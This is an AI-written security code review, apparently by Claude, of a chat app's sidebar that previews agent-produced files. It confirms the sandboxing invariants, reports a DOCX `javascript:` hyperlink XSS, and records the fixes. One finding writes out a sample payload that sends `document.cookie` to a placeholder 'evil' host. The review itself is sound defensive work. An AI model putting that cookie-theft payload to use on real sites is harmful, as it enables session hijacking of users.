---
phase: 37B-web-artifact-sidebar
reviewed: 2026-07-09T00:00:00Z
depth: deep
files_reviewed: 21
files_reviewed_list:
  - web/src/chat/artifacts/artifactMeta.ts
  - web/src/chat/artifacts/downloadAll.ts
  - web/src/chat/artifacts/useBlobPreview.ts
  - web/src/chat/artifacts/PreviewModal.tsx
  - web/src/chat/artifacts/useThreadArtifacts.ts
  - web/src/chat/artifacts/ArtifactRow.tsx
  - web/src/chat/artifacts/ArtifactsPanel.tsx
  - web/src/chat/artifacts/renderers/ImagePreview.tsx
  - web/src/chat/artifacts/renderers/PdfPreview.tsx
  - web/src/chat/artifacts/renderers/TextPreview.tsx
  - web/src/chat/artifacts/renderers/HtmlPreview.tsx
  - web/src/chat/artifacts/renderers/DocxPreview.tsx
  - web/src/chat/artifacts/renderers/XlsxPreview.tsx
  - web/src/chat/artifacts/renderers/PreviewStatus.tsx
  - web/src/chat/artifacts/renderers/useAssetContent.ts
  - web/src/chat/sseAdapter.ts
  - web/src/chat/ExternalStoreChat.tsx
  - web/src/chat/ExternalStoreChat_messages.tsx
  - web/src/chat/attachments/types.ts
  - web/src/AppShell.tsx
  - web/src/shell/useArtifactsPanel.ts
  - web/src/shell/ArtifactsShell.tsx
  - web/src/chat/displays/LocalArtifactDisplay.tsx
findings:
  critical: 0
  high: 1
  medium: 1
  low: 3
  total: 5
status: resolved
remediated: 2026-07-09
---

## Remediation (2026-07-09)

All actionable findings fixed on `master` after the review; tsc + eslint (`--max-warnings=0`) + prettier clean, `src/chat` suite 475 tests + artifacts 80 tests green.

| Finding | Disposition | Where |
|---------|-------------|-------|
| **H-01** DOCX `javascript:` href XSS | **FIXED** | `3b72f857` — extracted `hardenDocxLinks()` into its own pure module (unit-testable independently of the mocked docx-preview), applied to `renderAsync` output; new `hardenDocxLinks.test.ts` (4 cases: js/data/vbscript stripped, http(s) → noopener/_blank, relative untouched, no-anchor no-op) |
| **M-01** DOCX stale-render race | **FIXED** | `3b72f857` — post-`await renderAsync` cancellation re-check via an `isCancelled()` getter (TS cannot narrow a call return across the await), clears stale output |
| **L-01** missing `encodeURIComponent` | **FIXED** | `cfc0e4a3` — all 7 download/fetch sites now encode the id, matching `attachments/api.ts:16` |
| **L-02** redundant `useBlobPreview` dep | **KEPT AS-IS** | `key` is consumed inside the effect for the stale-result guard, so `react-hooks/exhaustive-deps` correctly requires it; dropping it introduces a lint warning. The "redundant" reading was the reviewer's own Low note. |
| **L-03** download filename normalization | **ACCEPTED** | per the reviewer's "not a required change" — the browser neutralizes the security aspect |

# Phase 37B: Code Review Report

**Reviewed:** 2026-07-09
**Depth:** deep (cross-file: renderer dispatch, SSE pump→AppShell wiring, D-15 fold, objectURL/AbortController lifecycles)
**Files Reviewed:** 21
**Status:** issues_found

## Summary

Phase 37B adds the "Artefatti" sidebar that previews **untrusted, agent-produced bytes** in-cockpit. I reviewed every renderer, the fetch/objectURL hooks, the SSE→panel signal, and the D-15 rehydration fold with an adversarial eye on the six named security invariants.

**Five of the six invariants hold and are solid:**

1. **HTML preview — null-origin sandbox: CONFIRMED.** `HtmlPreview.tsx:19` uses `sandbox="allow-scripts"` with **no** `allow-same-origin`, fed via `srcDoc` (never `src`). There is no code path where `allow-same-origin` co-occurs with `allow-scripts`. The invariant is also asserted in `renderers.test.tsx:154`.
2. **XLSX — empty sandbox + escaping: CONFIRMED.** `XlsxPreview.tsx:59` renders `sandbox=""` (fully inert); cell values are escaped by `sheet_to_html` and sheet names are additionally escaped by `escapeHtml` (`XlsxPreview.tsx:20-27,44`). Defense in depth holds even if the library's escaping regressed.
3. **SVG/PPTX download-only: CONFIRMED.** `previewKind` (`artifactMeta.ts:54`) gates `image/svg+xml`/`.svg` to `download` **before** the `image/*` branch; `.pptx` has no branch and falls through to `download`. No inline render path exists for either.
4. **useBlobPreview lifecycle/same-origin: CONFIRMED.** `useBlobPreview.ts:52-55` revokes the objectURL and aborts the fetch in the same cleanup; fetch is `credentials: 'same-origin'` against `/api/assets/{id}/download`. A stale (revoked) URL is never surfaced (key guard, line 61). `useAssetContent.ts` mirrors this correctly.
5. **Download surface = asset_id only: CONFIRMED.** Every download/fetch addresses `/api/assets/{id}/download` or `?thread_id=`; no `object_key`/`object_bucket`/host path is ever placed in the DOM. The reducer explicitly omits `path` from the synthesized payload in **both** branches (`sseAdapter.ts:341-363`).
6. **No external document-viewer: CONFIRMED.** No Office Online / Google Docs viewer or any external host is contacted (grep clean); docx/xlsx parse client-side.

Also verified correct: the D-15 split-fold routes agent assets to **assistant** turns and uploads to **user** turns (`ExternalStoreChat.tsx:339-341`); `onArtifact` fires from the **pump**, never the pure reducer (`sseAdapter.ts:526-532`, `reduceFrame` has no such call); the newest-first sort copies before sorting (`useThreadArtifacts.ts:36`, no server-state mutation); AbortController/objectURL lifecycles are clean.

**The one real hole is the DOCX path** — the single untrusted-render surface that runs **in our origin without a sandbox**, and the only renderer whose library behaviour tests mock away. See H-01.

## High

### H-01: DOCX preview renders untrusted bytes in our origin; `javascript:` hyperlinks execute with session-cookie access on click

**File:** `web/src/chat/artifacts/renderers/DocxPreview.tsx:24` (and `web/node_modules/docx-preview/dist/docx-preview.mjs:3537`)

**Issue:** Unlike the HTML (null-origin sandbox) and XLSX (empty sandbox) paths, `DocxPreview` hands the untrusted Blob to `docx-preview`'s `renderAsync`, which injects the rendered document straight into an **unsandboxed, same-origin `<div ref={bodyRef}>`** (`DocxPreview.tsx:41-45`). I confirmed against the installed library (`docx-preview@0.4.0`) that `renderHyperlink` assigns the anchor href verbatim from the OOXML external relationship target with **no scheme validation**:

```js
// docx-preview.mjs:3532-3542
renderHyperlink(elem) {
    const res = this.toH(elem, ns.html, "a");
    res.href = '';
    if (elem.id) {
        const rel = this.document.documentPart.rels.find(it => it.id == elem.id && it.targetMode === "External");
        res.href = rel?.target ?? res.href;   // ← attacker-controlled, unsanitized
    }
    ...
}
```

An agent that is prompt-injected (the phase's stated threat model — "renders UNTRUSTED bytes") can deliver a `.docx` whose external hyperlink target is `javascript:fetch('https://evil/x?c='+document.cookie)`. `renderAsync` renders `<a href="javascript:...">` into our origin's DOM; a single user click on that link runs arbitrary script with full access to `document.cookie` and the authenticated session — the exact isolation the phase engineered for HTML/XLSX, bypassed. The vector is **click-gated** (not zero-click), which is why this is High and not Critical, but users routinely click links inside documents. Secondary: rendered external hyperlinks/`<img>` carry no `rel="noopener"` and may fetch external resources, a privacy/tabnabbing leak against invariant #6. The docx path is also the only renderer whose library is fully mocked in tests (`renderers.test.tsx:20`), so this behaviour is unverified by the suite.

**Fix:** Neutralize active hrefs after render, or render docx inside a sandbox as the other untrusted paths do. Minimal in-place hardening:

```tsx
await renderAsync(blob, body, styleRef.current ?? undefined, {
  className: 'aura-docx',
  inWrapper: true,
  ignoreLastRenderedPageBreak: true,
});
if (controller.signal.aborted) return;
// Strip active-scheme hrefs the library copied verbatim; harden external links.
body.querySelectorAll('a[href]').forEach((a) => {
  const href = a.getAttribute('href') ?? '';
  if (/^\s*(javascript|data|vbscript):/i.test(href)) a.removeAttribute('href');
  else if (/^\s*https?:/i.test(href)) {
    a.setAttribute('rel', 'noopener noreferrer');
    a.setAttribute('target', '_blank');
  }
});
```

Add a test that feeds a docx whose hyperlink target is `javascript:...` and asserts the rendered anchor has no executable href.

## Medium

### M-01: DocxPreview `renderAsync` result is not guarded after the await — wrong/garbled document on rapid asset switch

**File:** `web/src/chat/artifacts/renderers/DocxPreview.tsx:21-36`

**Issue:** The abort check (`if (controller.signal.aborted) return;`, line 23) runs **before** `await renderAsync(...)`, but `renderAsync` itself is not cancellable and there is no re-check after it resolves. On a rapid asset switch (blob A → blob B), the effect for A can pass its abort check, start `renderAsync(A)`, then cleanup aborts + clears the body and the B effect begins `renderAsync(B)` into the **same** `bodyRef` element. `docx-preview` clears and repopulates the container on completion, so whichever `renderAsync` resolves last wins — a late-resolving `renderAsync(A)` clobbers B and shows the **wrong document**. (XlsxPreview does not have this bug: its only `await` is the dynamic import, which is re-checked immediately; the parse+`setDoc` are synchronous afterward.)

**Fix:** Track cancellation across the await and clear on stale completion:

```tsx
useEffect(() => {
  const body = bodyRef.current;
  if (blob === undefined || body === null) return;
  let cancelled = false;
  void (async () => {
    const { renderAsync } = await import('docx-preview');
    if (cancelled) return;
    await renderAsync(blob, body, styleRef.current ?? undefined, { /* ... */ });
    if (cancelled) body.innerHTML = '';           // discard a stale late render
  })().catch((e: unknown) => { if (!cancelled) setRenderError(String(e)); });
  return () => { cancelled = true; body.innerHTML = ''; };
}, [blob]);
```

## Low

### L-01: Asset id interpolated into download URLs without `encodeURIComponent` — deviates from the codebase's own convention

**File:** `web/src/chat/artifacts/useBlobPreview.ts:39`, `renderers/useAssetContent.ts:33`, `PreviewModal.tsx:73,101`, `ArtifactRow.tsx:65`, `downloadAll.ts:32`, `displays/LocalArtifactDisplay.tsx:55`, `ExternalStoreChat_messages.tsx:149`

**Issue:** Seven 37B call sites build `` `/api/assets/${assetId}/download` `` with a bare template literal, while the established API helper already encodes: `attachments/api.ts:16` uses `` `/api/assets/${encodeURIComponent(id)}` ``. Ids are server-generated UUIDs today so this is not exploitable, but it is a defense-in-depth/consistency gap and violates CLAUDE.md "FOLLOW EXISTING PATTERNS." A future id source containing `/`, `?`, `#`, or `..` would alter the request path.

**Fix:** Wrap every id interpolation in `encodeURIComponent(assetId)` (and `encodeURIComponent(a.id)` in `downloadAll.ts`), matching `api.ts:16`.

### L-02: `useBlobPreview` effect lists a derived value (`key`) in its dependency array

**File:** `web/src/chat/artifacts/useBlobPreview.ts:56`

**Issue:** Deps are `[assetId, mimeType, key]`, but `key = `${assetId} ${mimeType ?? ''}`` is derived purely from `assetId`+`mimeType`. The third entry is redundant (harmless — it can never change independently) and slightly muddies the lifecycle contract vs. the cleaner `useAssetContent.ts:51` (`[assetId, kind]`).

**Fix:** Drop `key` from the array: `}, [assetId, mimeType]);` — behaviour is identical, intent is clearer.

### L-03: `downloadAll` uses `a.file_name` as the `download` attribute without normalization

**File:** `web/src/chat/artifacts/downloadAll.ts:33` (also `PreviewModal.tsx:74,102`, `ArtifactRow.tsx:66`)

**Issue:** `link.download = a.file_name` trusts the server-supplied name verbatim. Browsers sanitize the `download` attribute (strip path separators) so this is not a traversal risk, but a name like `report\n.pdf` or an over-long name yields a confusing saved filename. Purely cosmetic given the server already validates on ingest.

**Fix:** Optional — clamp/normalize the display name (strip control chars) before assigning; acceptable to leave as-is since the browser neutralizes the security aspect. Documented for completeness, not a required change.

---

_Reviewed: 2026-07-09_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
